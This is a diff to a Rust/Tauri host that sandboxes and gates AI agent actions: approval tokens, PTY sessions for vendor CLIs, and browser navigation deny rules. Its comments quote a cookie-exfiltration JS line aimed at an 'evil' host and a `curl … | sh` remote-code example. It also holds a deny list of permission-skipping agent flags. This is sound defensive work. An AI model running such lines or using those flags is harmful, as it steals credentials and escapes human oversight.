@@ -34,13 +34,30 @@
 
 use std::collections::{BTreeMap, HashMap};
 use std::fs;
-use std::io::Write;
+use std::io::{Read, Write};
 use std::path::{Path, PathBuf};
 use std::sync::Mutex;
 use std::time::{SystemTime, UNIX_EPOCH};
 
 use serde::{Deserialize, Serialize};
-use tauri::{AppHandle, Manager, State};
+use tauri::{AppHandle, Emitter, Manager, State};
+
+// OS-sandbox: the host-side enforcement layer. `governed_command` wraps every
+// spawned child in a least-privilege sandbox built here (mirror of src/sandbox.ts
+// + the host-only realpath resolution the TS delegates). See sandbox.rs.
+mod sandbox;
+
+// R6 Lane-B real-PTY host: the reusable session registry / sandbox policy /
+// low-level PTY open for governed interactive vendor-CLI sessions. The
+// `#[tauri::command]` wiring (token spend + reader thread + audit) lives below,
+// where the governance state is owned. See pty.rs.
+mod pty;
+
+// R6 Lane-C governed CDP browser host: the real BrowserDriver src/browser.ts
+// injects — an async Chrome DevTools Protocol client + the non-http(s) hard-deny
+// (`is_safe_http_url`) the host mirrors from governance.ts. The `#[tauri::command]`
+// wiring (token spend + connection registry + audit) lives below. See browser.rs.
+mod browser;
 
 /// Token bundle mirrored to the CLI's config field names ({token, refreshToken})
 /// so the two clients share one mental model. Serialized as camelCase so the
@@ -595,14 +612,63 @@ fn classify(kind: &str, argv: &[String], path: Option<&str>) -> (&'static str, &
             }
         }
     }
+    // pty.spawn hard-denies — the host-side mirror of governance.ts's pty deny
+    // block, load-bearing because in PRODUCTION createTauriGovernance delegates
+    // request() straight to this Rust classify (the TS classifyAction runs ONLY
+    // in the dev/test in-memory backend). So THIS is the sole classifier that sees
+    // a prod pty.spawn: without these denies, `claude --mcp-config evil.json` could
+    // reach the native Allow dialog and, once approved, achieve sandbox-in RCE +
+    // (~/.claude read + network ON) credential exfil. For this kind the caller
+    // passes the pty ARGS as `argv` and the pty CWD as `path` (see request_action).
+    // A denied action is never even surfaced for approval.
+    if kind == "pty.spawn" {
+        if has_dangerous_pty_flag(argv).is_some() {
+            return ("deny", "dangerous PTY flag blocked (permission-skip / config-inject)");
+        }
+        if let Some(p) = path {
+            if sandbox::is_sensitive_dir(p) {
+                return ("deny", "PTY cwd in a system/secrets directory blocked");
+            }
+        }
+    }
+    // browser.navigate off http/https (file://, javascript:, data:, chrome://,
+    // about:…) would pivot a browser-control agent off the web into the local
+    // machine / the browser's internals — DENY, never surfaced for approval. The
+    // host-side mirror of governance.ts's browser.navigate hard-deny: LOAD-BEARING
+    // because in PRODUCTION createTauriGovernance delegates request() straight to
+    // THIS classify (the TS classifyAction runs only in the dev/test in-memory
+    // backend), so this is the sole classifier that sees a prod browser.navigate.
+    // request_action passes the navigate URL as `path` for this check (same
+    // convention as pty passing cwd as path).
+    if kind == "browser.navigate" && !browser::is_safe_http_url(path) {
+        return ("deny", "non-http(s) navigation blocked");
+    }
     // 2. Explicit auto-allow set (read-only / local-keyless only).
     if kind == "probe.detect" || kind == "local.dispatch" {
         return ("auto-allow", "read-only / local-keyless");
     }
     // 3. FAIL-CLOSED default — unknown kinds land here too.
+    // `pty.spawn` (Lane-B real-PTY) is an explicit, reasoned-about side-effecting
+    // kind — it opens an interactive vendor CLI, so it requires approval. Listed
+    // here so it reports "side-effecting action", not "unknown action" (the
+    // vendor/cwd/flag hard-denies live in the TS classifier + pty_spawn's own
+    // resolution; classify only decides the auto-allow/approval split).
+    // browser.* (Lane-C governed CDP browser host) are EXPLICIT, reasoned-about
+    // side-effecting kinds — even a read observes a possibly-authenticated remote
+    // page. Listed here so they report "side-effecting action" (matching the TS
+    // classifyAction, which recognises them via isActionKind), not "unknown action".
     let known = matches!(
         kind,
-        "direct.dispatch" | "spawn.launch" | "command.run" | "mcp.tool" | "file.write"
+        "direct.dispatch"
+            | "spawn.launch"
+            | "command.run"
+            | "mcp.tool"
+            | "file.write"
+            | "pty.spawn"
+            | "browser.navigate"
+            | "browser.read"
+            | "browser.interact"
+            | "browser.eval"
     );
     if known {
         ("require-approval", "side-effecting action")
@@ -628,6 +694,63 @@ fn is_destructive(joined: &str) -> bool {
 /// True when a path tries to escape its base via a `..` segment.
 fn is_traversal(path: &str) -> bool {
     path.split(['/', '\\']).any(|seg| seg == "..")
+}
+
+/// Flags that turn a "governed PTY session" into arbitrary code execution — the
+/// host mirror of governance.ts `DANGEROUS_PTY_FLAGS`. `--mcp-config evil.json`
+/// registers an MCP stdio server whose command can be `sh -c 'curl … | sh'`,
+/// escaping the "only claude/codex" containment into full RCE;
+/// `--dangerously-skip-permissions` removes the vendor CLI's own prompts (the
+/// supervision the "human watches the terminal" design relies on). HARD-DENIED
+/// for the in-app governed PTY (the user may still run them in their OWN terminal
+/// via `braavo spawn`, outside the moat). Returns the offending flag class for the
+/// audit line, None when clean.
+///
+/// Byte-for-byte parity with the TS regexes (verified in the parity test):
+///   /^--dangerously[\w-]*/i  — any arg PREFIXED `--dangerously`
+///   /^--mcp-config\b/i · /^--mcp-server\b/i · /^--permission-mode\b/i · /^--yolo\b/i
+///   /^--allowed-?tools\b/i   — optional hyphen: `--allowedtools` OR `--allowed-tools`
+/// The `\b`-anchored ones also catch the `=`-adjacent form (`--mcp-config=evil`),
+/// exactly as `\b` does. Case-insensitive; each arg is trimmed first (as the TS).
+/// KNOWN FOLLOW-UP: `--permission-prompt-tool` (another prompt-suppressor) is NOT
+/// on the TS list yet; add to BOTH lists in lockstep when the TS denylist grows.
+fn has_dangerous_pty_flag(args: &[String]) -> Option<&'static str> {
+    for raw in args {
+        // Trim the same whitespace set JS String.prototype.trim strips — ASCII
+        // whitespace PLUS the Unicode BOM/ZWNBSP (U+FEFF), so a "\u{feff}--yolo"
+        // can't slip past a plain ASCII trim and defeat the byte-for-byte claim.
+        let a = raw.trim_matches(|c: char| c.is_whitespace() || c == '\u{feff}').to_ascii_lowercase();
+        // /^--dangerously[\w-]*/ — unanchored suffix, so a prefix match is enough.
+        if a.starts_with("--dangerously") {
+            return Some("--dangerously-*");
+        }
+        for (flag, label) in [
+            ("--mcp-config", "--mcp-config"),
+            ("--mcp-server", "--mcp-server"),
+            ("--permission-mode", "--permission-mode"),
+            ("--yolo", "--yolo"),
+        ] {
+            if flag_word_boundary(&a, flag) {
+                return Some(label);
+            }
+        }
+        // /^--allowed-?tools\b/ — the optional hyphen is two spellings.
+        if flag_word_boundary(&a, "--allowed-tools") || flag_word_boundary(&a, "--allowedtools") {
+            return Some("--allowed-tools");
+        }
+    }
+    None
+}
+
+/// True when `arg` equals `flag` or is `flag` followed by a NON-word char — the
+/// manual, regex-free equivalent of a `^<flag>\b` match (catches `--flag` and
+/// `--flag=value` and `--flag-x`, but not `--flagword`). `arg` is pre-lowercased.
+fn flag_word_boundary(arg: &str, flag: &str) -> bool {
+    match arg.strip_prefix(flag) {
+        Some("") => true,
+        Some(rest) => rest.chars().next().map_or(true, |c| !(c.is_ascii_alphanumeric() || c == '_')),
+        None => false,
+    }
 }
 
 /// Strip anything credential-shaped from free text before it enters the ledger.
@@ -736,14 +859,53 @@ struct ActionDetail {
     server: Option<String>,
     vendor: Option<String>,
     provider: Option<String>,
+    /// browser.navigate: the target URL. Bound into the token so an approval for
+    /// bank.com can't be spent to reach evil.com (TS governance binds `url`; this
+    /// field closes the gap where the host previously dropped it on deserialize).
+    url: Option<String>,
+    /// pty.spawn: extra argv passed to the vendor bin. Bound into the token so an
+    /// approval for one flag-set can't launch a different one (TS binds `args`;
+    /// same silently-dropped-field gap as `url`).
+    args: Option<Vec<String>>,
+    /// browser.eval: the JS the token authorizes. Bound into the token (an approval
+    /// for js='X' can't be spent on js='Y') AND shown in the native dialog so the
+    /// human sees what will actually run — but NEVER written to the audit ledger
+    /// (the length-only `summary` is what lands there). Dialog visibility and ledger
+    /// privacy are DELIBERATELY separate surfaces (S-012 consent vs redacted trail).
+    js: Option<String>,
+    /// browser.interact: the element selector + typed value + interact kind. Bound
+    /// into the token (an approval for one selector/value can't be swapped) AND
+    /// shown in the dialog; the RAW value (a possible password) never enters the
+    /// ledger — same dialog-vs-ledger split as `js`.
+    selector: Option<String>,
+    value: Option<String>,
+    interact_kind: Option<String>,
 }
 
 impl ActionDetail {
     /// Stable binding key so a token issued for action A can't authorize B.
+    /// `url` + `args` bind a browser.navigate token to its exact URL and a pty.spawn
+    /// token to its exact flag-set; `js` + `selector`/`value`/`interact_kind` bind a
+    /// browser.eval / browser.interact token to its exact code / target — so an
+    /// approval for eval('X') can't be spent on eval('Y'), matching the TS governance
+    /// bindingKey. request_action and consume_action build the binding from the SAME
+    /// struct, so adding the fields keeps host mint/consume in step.
     fn binding(&self, kind: &str) -> String {
         format!(
-            "{kind}|{:?}|{:?}|{:?}|{:?}|{:?}|{:?}|{:?}",
-            self.argv, self.cwd, self.path, self.tool, self.server, self.vendor, self.provider
+            "{kind}|{:?}|{:?}|{:?}|{:?}|{:?}|{:?}|{:?}|{:?}|{:?}|{:?}|{:?}|{:?}|{:?}",
+            self.argv,
+            self.cwd,
+            self.path,
+            self.tool,
+            self.server,
+            self.vendor,
+            self.provider,
+            self.url,
+            self.args,
+            self.js,
+            self.selector,
+            self.value,
+            self.interact_kind
         )
     }
     fn summary_or(&self, kind: &str) -> String {
@@ -763,11 +925,44 @@ impl ActionDetail {
         if let Some(argv) = self.argv.as_ref().filter(|a| !a.is_empty()) {
             lines.push(format!("Command: {}", sanitize_field(&argv.join(" "))));
         }
+        // pty.spawn extra flags — part of what the token authorizes, so the human
+        // must see them (e.g. a `--dangerously-*` flag hiding behind a benign summary).
+        if let Some(args) = self.args.as_ref().filter(|a| !a.is_empty()) {
+            lines.push(format!("Args: {}", sanitize_field(&args.join(" "))));
+        }
         if let Some(cwd) = &self.cwd {
             lines.push(format!("Directory: {}", sanitize_field(cwd)));
         }
         if let Some(path) = &self.path {
             lines.push(format!("Path: {}", sanitize_field(path)));
+        }
+        // browser.navigate target — the human confirms the exact destination the
+        // token binds to, not the webview's free-text summary.
+        if let Some(url) = &self.url {
+            lines.push(format!("URL: {}", sanitize_field(url)));
+        }
+        // browser.eval — the EXACT JS the token authorizes. Shown here (ephemeral
+        // native dialog) so a blind "Action: browser.eval" can't hide
+        // `location.href='https://evil/'+document.cookie`; the ledger still keeps
+        // only a length-only summary, never this source. Gated on kind so a stray
+        // `js` field on another action can't inject a dialog line.
+        if kind == "browser.eval" {
+            if let Some(js) = &self.js {
+                lines.push(format!("JS: {}", sanitize_field(js)));
+            }
+        }
+        // browser.interact — the EXACT kind + selector (+ typed value) the token
+        // authorizes, so the human sees what will be clicked/typed rather than a
+        // bare "Action: browser.interact". Same ephemeral-dialog vs redacted-ledger
+        // split: the raw value is shown here but never persisted.
+        if kind == "browser.interact" {
+            let k = self.interact_kind.as_deref().unwrap_or("");
+            let sel = self.selector.as_deref().unwrap_or("");
+            let mut line = format!("Interact: {} {}", sanitize_field(k), sanitize_field(sel));
+            if let Some(v) = &self.value {
+                line.push_str(&format!(" = {}", sanitize_field(v)));
+            }
+            lines.push(line);
         }
         if let Some(server) = &self.server {
             lines.push(format!("Server: {}", sanitize_field(server)));
@@ -802,6 +997,19 @@ fn sanitize_field(s: &str) -> String {
         format!("{head}…")
     } else {
         redacted
+    }
+}
+
+/// One extra dialog line stating the sandbox scope a `command.run` will run under,
+/// so the human approves the ISOLATION, not just the command. Only command.run is
+/// spawned inside the OS sandbox (`default_policy(cwd)` — write→cwd, network OFF),
+/// so the note is emitted solely for that kind with a cwd; other kinds return None
+/// (adding a sandbox claim there would be dishonest). Kept a single line per the
+/// "don't over-engineer" review note.
+fn sandbox_dialog_line(kind: &str, cwd: Option<&str>) -> Option<String> {
+    match (kind, cwd) {
+        ("command.run", Some(c)) => Some(format!("Sandbox: write→{}, network OFF", sanitize_field(c))),
+        _ => None,
     }
 }
 
@@ -935,14 +1143,32 @@ fn mint_id(prefix: &str, seq: u64) -> String {
 fn request_action(app: AppHandle, gov: State<'_, Governance>, kind: String, detail: Option<ActionDetail>, ts: Option<u64>) -> Result<GateResult, String> {
     let detail = detail.unwrap_or_default();
     let ts = ts.unwrap_or(0);
-    let (decision, reason) = classify(&kind, detail.argv.as_deref().unwrap_or(&[]), detail.path.as_deref());
+    // For pty.spawn the classifier's hard-denies live on the pty fields, so pass
+    // the ARGS as argv and the CWD as path (classify's pty block reads them there);
+    // every other kind uses argv/path directly.
+    let (decision, reason) = if kind == "pty.spawn" {
+        classify(&kind, detail.args.as_deref().unwrap_or(&[]), detail.cwd.as_deref())
+    } else if kind == "browser.navigate" {
+        // browser.navigate's hard-deny is on the URL; classify reads it via `path`
+        // (same convention as pty passing its cwd as path). The token is still
+        // bound to the url through ActionDetail::binding, unaffected by this.
+        classify(&kind, &[], detail.url.as_deref())
+    } else {
+        classify(&kind, detail.argv.as_deref().unwrap_or(&[]), detail.path.as_deref())
+    };
     let mut gate = gov.0.lock().map_err(|_| "gate poisoned")?;
     let action_id = mint_id("act", gate.seq + 1);
     let binding = detail.binding(&kind);
     let summary = detail.summary_or(&kind);
     // Trust surface for the native dialog is derived from the ENFORCED fields,
-    // NOT the webview's free-text summary (S-012 HIGH fix).
-    let dialog_text = detail.enforced_dialog_text(&kind);
+    // NOT the webview's free-text summary (S-012 HIGH fix). For command.run,
+    // append the sandbox scope the host will actually enforce so the human
+    // approves the isolation too (R6 P3-8).
+    let mut dialog_text = detail.enforced_dialog_text(&kind);
+    if let Some(line) = sandbox_dialog_line(&kind, detail.cwd.as_deref()) {
+        dialog_text.push('\n');
+        dialog_text.push_str(&line);
+    }
 
     match decision {
         "deny" => {
@@ -1136,8 +1362,11 @@ struct CommandResult {
 /// It requires a valid one-time token (from an approved request), enforces a
 /// working-dir allowlist (canonicalized — no `..` escape), builds an argv ARRAY
 /// (never a shell string), optionally clears the environment, and applies a
-/// timeout. This is the enforcement surface; a real OS sandbox around it is a
-/// documented human-gate.
+/// timeout. R6: it now ALSO wraps the child in a real OS sandbox (seatbelt on
+/// macOS, bubblewrap on Linux) built from a least-privilege policy — so even a
+/// human-APPROVED command is bounded to its project roots, can't read the user's
+/// secrets, and can't reach the network. Fail-closed: if the sandbox can't be
+/// built or its launcher is missing, the command is refused, never run bare.
 #[tauri::command]
 fn governed_command(
     app: AppHandle,
@@ -1152,7 +1381,9 @@ fn governed_command(
     use std::process::{Command, Stdio};
     let ts = ts.unwrap_or(0);
 
-    // 1. Spend the token — a command CANNOT run without passing the gate.
+    // 1. Spend the token — a command CANNOT run without passing the gate. The
+    //    map removal IS the gate; the "consumed" ledger line is deferred to step
+    //    4 so it can record the sandbox isolation the command actually ran under.
     let detail = ActionDetail { argv: Some(argv.clone()), cwd: Some(cwd.clone()), ..Default::default() };
     {
         let mut gate = gov.0.lock().map_err(|_| "gate poisoned")?;
@@ -1165,7 +1396,6 @@ fn governed_command(
             return Err("invalid or already-spent token".into());
         }
         gate.tokens.remove(&token);
-        audit_append(&app, &mut gate, "command.run", "-", "consumed", &redact(&argv.join(" ")), ts);
     }
 
     // 2. Re-validate at the choke point (defense-in-depth, independent of policy).
@@ -1181,14 +1411,75 @@ fn governed_command(
         return Err("working directory is not in the allowlist".into());
     }
 
-    // 3. Build the child from an argv ARRAY — never a shell string.
-    let mut cmd = Command::new(&argv[0]);
-    cmd.args(&argv[1..]).current_dir(&cwd_path).stdout(Stdio::piped()).stderr(Stdio::piped());
-    if clean_env.unwrap_or(false) {
+    // 3. Build the least-privilege OS sandbox for THIS cwd. resolve_policy
+    //    realpath-resolves every root (BR-003: symlinks + firmlinks) so a write
+    //    root that secretly points at ~/.ssh is caught; wrap_command emits the
+    //    seatbelt/bubblewrap launcher prefix. FAIL-CLOSED at every step: a
+    //    resolution/validation failure or a missing launcher refuses the run —
+    //    the host NEVER falls back to an unsandboxed spawn.
+    let policy = sandbox::default_policy(&cwd_path);
+    let resolved = match sandbox::resolve_policy(&policy) {
+        Ok(r) => r,
+        Err(e) => {
+            if let Ok(mut gate) = gov.0.lock() {
+                audit_append(&app, &mut gate, "command.run", "-", "error", "sandbox: policy resolution refused", ts);
+            }
+            return Err(e);
+        }
+    };
+    let sandbox_summary = sandbox::describe_sandbox(&resolved);
+    let wrapped = match sandbox::wrap_command(&argv, &resolved) {
+        Ok(w) => w,
+        Err(e) => {
+            if let Ok(mut gate) = gov.0.lock() {
+                audit_append(&app, &mut gate, "command.run", "-", "error", "sandbox: wrap refused", ts);
+            }
+            return Err(e);
+        }
+    };
+
+    // 4. Audit the consumption now that the sandbox summary is known.
+    {
+        let mut gate = gov.0.lock().map_err(|_| "gate poisoned")?;
+        let line = format!("{} | {}", redact(&argv.join(" ")), sandbox_summary);
+        audit_append(&app, &mut gate, "command.run", "-", "consumed", &line, ts);
+    }
+
+    // 5. Build the child from the WRAPPED argv (sandbox launcher + policy + `--` +
+    //    the original argv) — still an argv ARRAY, never a shell string. The child
+    //    runs in `cwd`.
+    let mut cmd = Command::new(&wrapped[0]);
+    cmd.args(&wrapped[1..]).current_dir(&cwd_path).stdout(Stdio::piped()).stderr(Stdio::piped());
+    // Environment scrub. macOS seatbelt does NOT clear env, so the host does it
+    // UNCONDITIONALLY here and injects only a minimal, secret-free set — the
+    // mirror of Linux bwrap's `--clearenv` + `sandbox_env_args`, so both OSes
+    // uphold the same "the child does NOT inherit the host's secret env" guarantee
+    // (previously macOS only scrubbed when `clean_env` was set → asymmetric leak).
+    // `clean_env` is therefore now a NO-OP on the enforced path (env is ALWAYS
+    // clean); it is retained only for API compatibility.
+    #[cfg(target_os = "macos")]
+    {
+        let _ = clean_env; // env is unconditionally cleaned below; param kept for compat
         cmd.env_clear();
-        // Keep a minimal PATH so the binary resolves; nothing else leaks in.
-        if let Some(p) = std::env::var_os("PATH") {
-            cmd.env("PATH", p);
+        let home = resolved
+            .write_roots
+            .first()
+            .map(|w| w.to_string_lossy().into_owned())
+            .unwrap_or_else(|| cwd.clone());
+        cmd.env("PATH", "/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin");
+        cmd.env("HOME", home);
+        cmd.env("TERM", "xterm-256color");
+    }
+    #[cfg(not(target_os = "macos"))]
+    {
+        // Linux: bwrap --clearenv already scrubs the grandchild INSIDE the sandbox,
+        // so this only affects the outer bwrap process. Honour `clean_env` for the
+        // launcher env; the sandboxed grandchild is clean regardless.
+        if clean_env.unwrap_or(false) {
+            cmd.env_clear();
+            if let Some(p) = std::env::var_os("PATH") {
+                cmd.env("PATH", p);
+            }
         }
     }
 
@@ -1237,6 +1528,754 @@ fn command_allowlist(app: &AppHandle) -> Vec<PathBuf> {
         roots.push(home);
     }
     roots
+}
+
+// ── Lane-B real-PTY — the governed interactive vendor-CLI host ────────────────
+//
+// A webview cannot allocate a pseudo-terminal or spawn a child; only the host
+// can. `pty_spawn` opens a REAL PTY running the user's own vendor CLI (claude /
+// codex) — but ONLY through the same fail-closed gate as every other side effect:
+// it spends a one-time `pty.spawn` token (bound to vendor+cwd+args), enforces the
+// host-authoritative running-session cap BEFORE burning that token, resolves the
+// binary at neutral prefixes only, checks the cwd against the command allowlist,
+// and wraps the child in a least-privilege OS sandbox (`pty::pty_policy`,
+// fail-closed). Lifecycle ops (write/resize/kill) act on the ALREADY-approved
+// session — no per-keystroke gate (the human watches the live terminal; the
+// governance line is session-open). The reusable pieces live in pty.rs.
+
+/// The output event streamed to the webview terminal. `dataB64` is base64 because
+/// terminal bytes are not guaranteed UTF-8. Buffer content NEVER reaches audit.
+#[derive(Clone, Serialize)]
+#[serde(rename_all = "camelCase")]
+struct PtyOutputEvent {
+    session_id: String,
+    data_b64: String,
+}
+
+/// The exit event — the process ended (or was killed). `code` is None for a
+/// signal/kill with no numeric status.
+#[derive(Clone, Serialize)]
+#[serde(rename_all = "camelCase")]
+struct PtyExitEvent {
+    session_id: String,
+    code: Option<i32>,
+}
+
+/// The label of the app's single webview window (tauri.conf.json → windows[0]).
+/// PTY events are emitted TO this window (not globally) so a session's terminal
+/// bytes can never leak into another window if the app ever grows multi-window;
+/// today it is single-window, so a global emit would be equivalent — this just
+/// makes the scoping explicit and future-proof.
+const MAIN_WINDOW_LABEL: &str = "main";
+
+/// Start the background thread that drains a session's PTY output. Each chunk is
+/// base64'd into a `pty://output` event (targeted at the owning window) and its
+/// length added to the session's out-byte counter (redacted audit signal). On
+/// EOF/read-error it reaps the child (`mark_exited`), emits `pty://exit`, and
+/// appends the ONE settle audit line — vendor + cwd + byte counts + ending, NEVER
+/// buffer content.
+fn spawn_pty_reader(app: AppHandle, session_id: String, mut reader: Box<dyn Read + Send>) {
+    std::thread::spawn(move || {
+        let mut buf = [0u8; 8192];
+        loop {
+            match reader.read(&mut buf) {
+                Ok(0) => break, // EOF — the child's slave closed (it exited)
+                Ok(n) => {
+                    let data_b64 = pty::base64_encode(&buf[..n]);
+                    let payload = PtyOutputEvent { session_id: session_id.clone(), data_b64 };
+                    // Target the owning window; fall back to a global emit only if
+                    // that window can't be found (edge/headless cases).
+                    if app.emit_to(MAIN_WINDOW_LABEL, "pty://output", payload.clone()).is_err() {
+                        let _ = app.emit("pty://output", payload);
+                    }
+                    if let Some(state) = app.try_state::<pty::PtyHostState>() {
+                        state.note_output(&session_id, n);
+                    }
+                }
+                Err(_) => break, // read error → treat as end-of-session
+            }
+        }
+        // Reap + transition + report. mark_exited returns the final code, the
+        // redacted summary, and whether the session was user-killed.
+        let (code, summary) = match app.try_state::<pty::PtyHostState>() {
+            Some(state) => match state.mark_exited(&session_id) {
+                Some((code, summary, killed)) => {
+                    let payload = PtyExitEvent { session_id: session_id.clone(), code };
+                    if app.emit_to(MAIN_WINDOW_LABEL, "pty://exit", payload.clone()).is_err() {
+                        let _ = app.emit("pty://exit", payload);
+                    }
+                    let outcome = if killed { "killed" } else { "exited" };
+                    (outcome, summary)
+                }
+                None => return, // session vanished — nothing to report
+            },
+            None => return,
+        };
+        // Settle audit line (best-effort — an audit miss must never crash).
+        if let Some(gov) = app.try_state::<Governance>() {
+            if let Ok(mut gate) = gov.0.lock() {
+                audit_append(&app, &mut gate, "pty.spawn", "-", code, &summary, 0);
+            }
+        }
+    });
+}
+
+/// Open a governed interactive vendor-CLI session in a real PTY. Returns the
+/// host-side session id; output/exit arrive as `pty://output` / `pty://exit`
+/// events. Order is security-critical (see the inline steps): hard-denies +
+/// the cap are checked BEFORE the token is spent so a cap-full or policy-denied
+/// request never burns an approval.
+#[tauri::command]
+fn pty_spawn(
+    app: AppHandle,
+    gov: State<'_, Governance>,
+    state: State<'_, pty::PtyHostState>,
+    token: String,
+    vendor: String,
+    cwd: String,
+    args: Option<Vec<String>>,
+    ts: Option<u64>,
+) -> Result<String, String> {
+    let ts = ts.unwrap_or(0);
+    let vendor = vendor.trim().to_string();
+    let norm_args = pty::normalize_pty_args(args);
+
+    // Shared audit helper for every refusal/error path (best-effort — an audit
+    // miss must never crash a decision, but no path may pass silently).
+    let audit_pty = |outcome: &str, reason: &str| {
+        if let Ok(mut gate) = gov.0.lock() {
+            audit_append(&app, &mut gate, "pty.spawn", "-", outcome, reason, ts);
+        }
+    };
+
+    // ── HARD-DENIES — independent of classify, checked BEFORE the token is spent ──
+    // Defense-in-depth mirror of governance.ts's pty deny block (same shape as
+    // governed_command re-checking is_destructive at its choke point). LOAD-BEARING
+    // in production: createTauriGovernance delegates request() straight to the Rust
+    // gate, so the TS classifyAction never runs there — this choke point is the
+    // real enforcement. A policy deny NEVER touches the token.
+    if vendor_bin(&vendor).is_none() {
+        audit_pty("deny", "unknown PTY vendor blocked");
+        return Err(format!("unknown PTY vendor: {vendor}"));
+    }
+    if let Some(flag) = has_dangerous_pty_flag(norm_args.as_deref().unwrap_or(&[])) {
+        audit_pty("deny", &format!("dangerous PTY flag blocked: {flag}"));
+        return Err("dangerous PTY flag blocked (permission-skip / config-inject)".into());
+    }
+    if sandbox::is_sensitive_dir(&cwd) {
+        audit_pty("deny", "PTY cwd in a system/secrets directory blocked");
+        return Err("PTY cwd in a system/secrets directory blocked".into());
+    }
+
+    // (b) HOST-AUTHORITATIVE cap — BEFORE the token is spent, so a full host never
+    //     burns an approval it can't honour (the TS pre-check is only a UI
+    //     throttle). No token is touched on this path.
+    if let Err(e) = pty::admission_check(state.running_count()) {
+        audit_pty("cap-rejected", &e);
+        return Err(e);
+    }
+
+    // (a) Spend the one-time token. The binding mirrors ptySpawnToGate EXACTLY —
+    //     `args` present ONLY when non-empty (normalize) — so a no-arg approval
+    //     can't be replayed to open an args-full session (confused-deputy on args).
+    let detail = ActionDetail {
+        vendor: Some(vendor.clone()),
+        cwd: Some(cwd.clone()),
+        args: norm_args.clone(),
+        ..Default::default()
+    };
+    let binding = detail.binding("pty.spawn");
+    {
+        let mut gate = gov.0.lock().map_err(|_| "gate poisoned")?;
+        if !try_consume_token(&mut gate, &token, "pty.spawn", &binding) {
+            audit_append(&app, &mut gate, "pty.spawn", "-", "replay-rejected", "pty.spawn", ts);
+            return Err("invalid or already-spent token".into());
+        }
+    }
+
+    // (c) Resolve the vendor binary — a KNOWN vendor (asserted above), found on
+    //     PATH or a neutral prefix (never a token/config dir). "Not installed" is
+    //     an availability error (audited), distinct from the unknown-vendor deny.
+    let bin = vendor_bin(&vendor).expect("vendor known — checked before token spend");
+    let bin_path = match find_on_path(bin)
+        .or_else(|| neutral_prefixes(&app, &vendor, bin).into_iter().find(|p| p.is_file()))
+    {
+        Some(p) => p,
+        None => {
+            audit_pty("error", "pty: vendor binary not found");
+            return Err(format!("{bin} CLI not found on PATH or a neutral install prefix"));
+        }
+    };
+
+    // (d) cwd must realpath-resolve INSIDE the command allowlist (the same list
+    //     command.run uses) — rejects a relative / escaping / outside dir.
+    let cwd_path = PathBuf::from(&cwd);
+    if !workdir_allowed(&cwd_path, &command_allowlist(&app)) {
+        audit_pty("error", "pty: cwd not in allowlist");
+        return Err("working directory is not in the allowlist".into());
+    }
+
+    // (e) Vendor-profile sandbox (pty::pty_policy — wider than default_policy:
+    //     network ON + write to the vendor state dir). resolve → validate → wrap,
+    //     FAIL-CLOSED: a resolution/validation failure or missing launcher refuses
+    //     the run (a vendor CLI is never spawned bare/unsandboxed).
+    let home = match app.path().home_dir() {
+        Ok(h) => h,
+        Err(e) => {
+            audit_pty("error", "pty: home dir unresolved");
+            return Err(e.to_string());
+        }
+    };
+    let vendor_dir = pty::vendor_state_dir(&vendor, &home);
+    let mut policy = pty::pty_policy(&cwd_path, vendor_dir.as_deref());
+    // The approved binary may live at a neutral prefix OUTSIDE the system read set
+    // (~/.local/bin, ~/.bun/bin, ~/.cargo/bin). Grant read on JUST its parent dir
+    // so the sandbox can exec it — process-exec needs file-read on the binary
+    // path; without this a CLI installed under $HOME could not launch.
+    if let Some(parent) = bin_path.parent() {
+        policy.read_roots.push(parent.to_path_buf());
+    }
+    let resolved = match sandbox::resolve_policy(&policy) {
+        Ok(r) => r,
+        Err(e) => {
+            audit_pty("error", "pty: sandbox policy resolution refused");
+            return Err(e);
+        }
+    };
+    let mut argv = vec![bin_path.to_string_lossy().into_owned()];
+    argv.extend(norm_args.clone().unwrap_or_default());
+    let wrapped = match sandbox::wrap_command(&argv, &resolved) {
+        Ok(w) => w,
+        Err(e) => {
+            audit_pty("error", "pty: sandbox wrap refused");
+            return Err(e);
+        }
+    };
+
+    // Minimal, secret-free env. HOME = the REAL home: the vendor CLI reads its own
+    // $HOME/.claude|.codex for auth/config, and it is the SANDBOX (not a fake
+    // HOME) that actually bounds filesystem access — so a truthful HOME is safe
+    // here and necessary for the CLI to find its state. PATH stays minimal (+ the
+    // binary's own dir so the CLI's siblings resolve); TERM only, no TERM_PROGRAM.
+    let home_str = home.to_string_lossy().into_owned();
+    let mut path_val = String::from("/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/opt/homebrew/bin");
+    if let Some(parent) = bin_path.parent() {
+        path_val.push(':');
+        path_val.push_str(&parent.to_string_lossy());
+    }
+    let env = vec![
+        ("HOME".to_string(), home_str),
+        ("PATH".to_string(), path_val),
+        ("TERM".to_string(), "xterm-256color".to_string()),
+    ];
+
+    // (f) Open the PTY (default 80×24) and spawn the sandbox-wrapped vendor argv.
+    let bundle = match pty::open_pty_child(&wrapped, &cwd_path, &env, 80, 24) {
+        Ok(b) => b,
+        Err(e) => {
+            audit_pty("error", "pty: pty open failed");
+            return Err(e);
+        }
+    };
+    let pty::PtyChild { child, master, writer, reader } = bundle;
+
+    let session_id = mint_id("pty", now_ms());
+    let session = pty::Session::new(child, master, writer, vendor.clone(), cwd.clone());
+    // register defensively re-checks the cap (and tears the child down on refusal
+    // so a lost race can't leak a live process) — before the reader thread starts.
+    if let Err(e) = state.register(session_id.clone(), session) {
+        audit_pty("error", &format!("pty: register refused ({e})"));
+        return Err(e);
+    }
+
+    // Background reader: base64 chunks → pty://output, EOF → pty://exit + settle.
+    spawn_pty_reader(app.clone(), session_id.clone(), reader);
+
+    // (g) consumed audit — redacted "pty <vendor> in <cwd>".
+    {
+        let mut gate = gov.0.lock().map_err(|_| "gate poisoned")?;
+        audit_append(&app, &mut gate, "pty.spawn", "-", "consumed", &format!("pty {vendor} in {cwd}"), ts);
+    }
+
+    Ok(session_id)
+}
+
+/// Write user keystrokes into a running session (lifecycle op — no gate; the
+/// session was already approved at open).
+#[tauri::command]
+fn pty_write(state: State<'_, pty::PtyHostState>, session_id: String, data: String) -> Result<(), String> {
+    state.write_input(&session_id, data.as_bytes())
+}
+
+/// Resize the PTY (terminal panel resized).
+#[tauri::command]
+fn pty_resize(state: State<'_, pty::PtyHostState>, session_id: String, cols: u16, rows: u16) -> Result<(), String> {
+    state.resize(&session_id, cols, rows)
+}
+
+/// Terminate the session (safe direction — stopping needs no approval).
+#[tauri::command]
+fn pty_kill(state: State<'_, pty::PtyHostState>, session_id: String) -> Result<(), String> {
+    state.kill(&session_id)
+}
+
